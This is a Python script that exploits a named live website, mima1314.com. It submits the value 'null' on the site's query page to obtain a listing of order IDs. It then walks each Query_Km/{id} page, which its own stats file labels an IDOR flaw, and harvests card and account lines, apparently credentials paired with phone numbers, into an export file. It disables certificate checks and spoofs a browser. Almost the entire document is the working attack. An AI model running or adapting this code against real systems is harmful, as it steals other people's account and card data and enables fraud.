#!/usr/bin/env python3
"""mima1314 merge export: prior cards_only + fetch new null-page ddids only."""
import json
import os
import re
import sys
import time

import requests

requests.packages.urllib3.disable_warnings()

BASE = "https://mima1314.com"
OUT = sys.argv[1] if len(sys.argv) > 1 else "/workspace/mima1314_full_20260801"
PRIOR_CARDS = sys.argv[2] if len(sys.argv) > 2 else None
REFRESH_EVERY = 80

TOKEN_RE = re.compile(
    r'name=["\']__token__["\'][^>]*value=["\']([^"\']+)["\']'
    r'|value=["\']([^"\']+)["\'][^>]*name=["\']__token__["\']'
)
KM_RE = re.compile(r"/Query_Km/([a-zA-Z0-9]{10,14})")
LINE_RE = re.compile(r"(\d{5,}----[^\s<]{4,}|COM\d+----\d{11}[^\s<]*)")


def sess():
    s = requests.Session()
    s.verify = False
    s.headers.update(
        {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120",
            "Referer": BASE + "/Query.html",
        }
    )
    return s


def refresh_null_session(s):
    q = s.get(BASE + "/Query.html", timeout=25)
    tok = TOKEN_RE.search(q.text)
    if not tok:
        raise RuntimeError("no __token__")
    token = tok.group(1) or tok.group(2)
    p = s.post(
        BASE + "/Query.html",
        data={"value": "null", "page": "1", "__token__": token},
        headers={"Referer": BASE + "/Query.html"},
        timeout=120,
    )
    if "非法" in p.text:
        raise RuntimeError("null blocked")
    return len(set(KM_RE.findall(p.text)))


def get_ddids(s):
    refresh_null_session(s)
    q = s.get(BASE + "/Query.html", timeout=25)
    tok = TOKEN_RE.search(q.text)
    token = tok.group(1) or tok.group(2)
    p = s.post(
        BASE + "/Query.html",
        data={"value": "null", "page": "1", "__token__": token},
        headers={"Referer": BASE + "/Query.html"},
        timeout=120,
    )
    return sorted(set(KM_RE.findall(p.text)))


def extract_lines(html):
    text = re.sub(r"<script[^>]*>.*?</script>", " ", html, flags=re.S | re.I)
    text = re.sub(r"<style[^>]*>.*?</style>", " ", text, flags=re.S | re.I)
    text = re.sub(r"<[^>]+>", "\n", text)
    out, seen = [], set()
    for ln in text.splitlines():
        ln = ln.strip()
        if len(ln) < 20 or not LINE_RE.search(ln):
            continue
        if ln in seen:
            continue
        seen.add(ln)
        out.append(ln)
    return out


def fetch_cards(s, ddid):
    for attempt in range(3):
        try:
            r = s.get(
                BASE + "/Query_Km/" + ddid,
                headers={"Referer": BASE + "/Query.html"},
                timeout=15,
            )
            if r.status_code != 200 or len(r.text) < 200:
                return []
            return extract_lines(r.text)
        except Exception:
            time.sleep(1 + attempt)
    return []


def load_prior_ddids(cards_path):
    have = set()
    lines = 0
    if os.path.isfile(cards_path):
        with open(cards_path) as f:
            for ln in f:
                if "\t" in ln:
                    have.add(ln.split("\t", 1)[0].strip().upper())
                    lines += 1
    return have, lines


def main():
    os.makedirs(OUT, exist_ok=True)
    cards_path = os.path.join(OUT, "mima1314.com_cards.txt")
    stats_path = os.path.join(OUT, "STATS.json")

    if PRIOR_CARDS and os.path.isfile(PRIOR_CARDS):
        import shutil
        shutil.copy2(PRIOR_CARDS, cards_path)
        print(f"copied prior {PRIOR_CARDS}", flush=True)

    prior_ddids, prior_lines = load_prior_ddids(cards_path)
    s = sess()
    ddids = get_ddids(s)
    todo = [d for d in ddids if d.upper() not in prior_ddids]
    print(
        f"null={len(ddids)} prior_ddids={len(prior_ddids)} prior_lines={prior_lines} todo={len(todo)}",
        flush=True,
    )

    cards_open = open(cards_path, "a")
    new_ddids = 0
    new_lines = 0
    since_refresh = 0

    for i, ddid in enumerate(todo):
        if since_refresh >= REFRESH_EVERY:
            refresh_null_session(s)
            since_refresh = 0
        lines = fetch_cards(s, ddid)
        since_refresh += 1
        if lines:
            new_ddids += 1
            for ln in lines:
                cards_open.write(f"{ddid}\t{ln}\n")
                new_lines += 1
        if (i + 1) % 50 == 0 or i < 3:
            print(
                f"[{i+1}/{len(todo)}] new_lines={new_lines} new_ddids={new_ddids} last={ddid} n={len(lines)}",
                flush=True,
            )
        time.sleep(0.1)

    cards_open.close()

    with open(cards_path) as f:
        total_lines = sum(1 for _ in f)
    all_ddids = set()
    with open(cards_path) as f:
        for ln in f:
            if "\t" in ln:
                all_ddids.add(ln.split("\t", 1)[0].upper())

    stats = {
        "target": "mima1314.com",
        "date": time.strftime("%Y-%m-%d"),
        "status": "success",
        "vuln": "Query.html value=null session + Query_Km/{ddid} IDOR",
        "ts": time.strftime("%Y-%m-%d %H:%M:%S"),
        "null_ddids": len(ddids),
        "prior_ddids": len(prior_ddids),
        "prior_lines": prior_lines,
        "new_ddids_fetched": new_ddids,
        "new_lines": new_lines,
        "unique_ddids": len(all_ddids),
        "cards": total_lines,
        "export_dir": OUT,
    }
    with open(stats_path, "w") as f:
        json.dump(stats, f, indent=2, ensure_ascii=False)
    print("DONE", json.dumps(stats, ensure_ascii=False), flush=True)


if __name__ == "__main__":
    main()
